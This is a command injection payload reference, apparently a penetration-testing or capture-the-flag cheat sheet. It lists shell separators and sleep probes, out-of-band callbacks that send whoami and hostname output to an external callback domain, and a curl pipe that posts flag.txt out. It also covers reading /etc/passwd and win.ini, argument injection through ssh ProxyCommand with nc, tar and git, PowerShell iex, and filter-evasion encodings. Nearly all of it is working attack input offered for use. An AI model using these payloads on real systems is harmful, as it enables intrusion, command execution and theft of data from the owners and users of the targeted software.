# OS Command Injection Payload Reference

## Detection probes (safe, observable)

```text
;sleep 7        && sleep 7       || sleep 7       | sleep 7
$(sleep 7)      `sleep 7`        %0asleep 7       & sleep 7 &
a;sleep(7)      ';sleep 7;'      ";sleep 7;"
```

## OOB callbacks

```bash
;nslookup <id>.oast.pro
`curl https://<id>.oast.pro/$(whoami)`
$(wget -q -O- http://<id>.oast.pro/$HOSTNAME)
# Windows
& nslookup %COMPUTERNAME%.<id>.oast.pro
```

## Output extraction (when blind)

```bash
;cat flag.txt | curl -X POST -d @- https://<id>.oast.pro/
;cp /etc/passwd /var/www/html/static/p.txt   # if webroot writable+readable
;sleep $(grep -c root /etc/passwd)           # length oracle timing
```

## Quoting contexts

```text
Inside '...' :  '; id ; echo '
Inside "..." :  "; id ; echo "     or     $(id)
After escape \': \' id \' rarely works; prefer closing quote first
```

## Argument injection sets

```text
curl/wget:   --output=/tmp/x --url=file:///etc/passwd
ssh:         -oProxyCommand=nc <host> <port>
scp:         -oProxyCommand=bash -c id|
tar:         --to-command=id   --checkpoint-action=exec=id
zip:         --unzip-command="id"
git:         ext::sh -c id
find:        -exec id ;
```

## Windows cmd equivalents

```text
& whoami &    | whoami    && whoami    %0a whoami
%USERNAME%.<oob>   & type C:\Windows\win.ini
powershell -c iex(...) where powershell is reachable
```

## Filter evasion vocabulary

```text
${IFS}          $IFS$9          {cmd,arg} brace expansion
%0A             %%0A            double encode %2527
wildcards:      /e?c/?asswd     /etc/*sh*
concat vars:    a=ca;t $a t /flag
backslash break:c\at /et\c/pa\ss\wd
```
